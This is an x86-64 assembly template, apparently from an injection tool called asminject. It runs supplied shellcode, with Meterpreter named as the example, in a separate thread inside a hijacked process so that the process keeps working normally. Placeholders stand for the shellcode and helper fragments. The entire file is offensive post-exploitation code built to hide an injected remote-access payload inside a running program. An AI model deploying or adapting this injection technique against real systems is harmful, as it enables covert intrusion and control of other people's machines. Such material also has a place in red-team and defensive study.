# This code will launch the specified binary shellcode (e.g. Meterpreter)
# in a new, separate thread, then return to the original code
# so that the target process continues executing normally after injection
# However, it requires the offset for pthread_create in libpthread to do this
#
# WARNING: the binary shellcode can still cause the entire target process
# to exit. For example, with the default build options, Meterpreter will 
# happily execute in a separate thread, but if you execute the "exit" 
# command from the Meterpreter shell, it will kill the entire target process

jmp execute_precompiled_threaded_main
// import reusable code fragments 
[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_detach.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_exit.s:FRAGMENT]

execute_precompiled_threaded_main:

mov rsi, 0
mov rdi, arbitrary_read_write_data_address[rip]
add rdi, 0x1000		# don't overwrite anything important
mov rcx, 0
lea rdx, [VARIABLE:PRECOMPILED_SHELLCODE_LABEL:VARIABLE][rip]
push rdi
call asminject_libpthread_pthread_create
pop rdi
call asminject_libpthread_pthread_detach

[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]:

# inlined shellcode will go after this delimiter
SHELLCODE_SECTION_DELIMITER

[VARIABLE:INLINE_SHELLCODE:VARIABLE]

# since this is threaded execution, exit the thread instead of returning
mov rdi, 0
call asminject_libpthread_pthread_exit

jump_back_from_shellcode:

jmp [VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]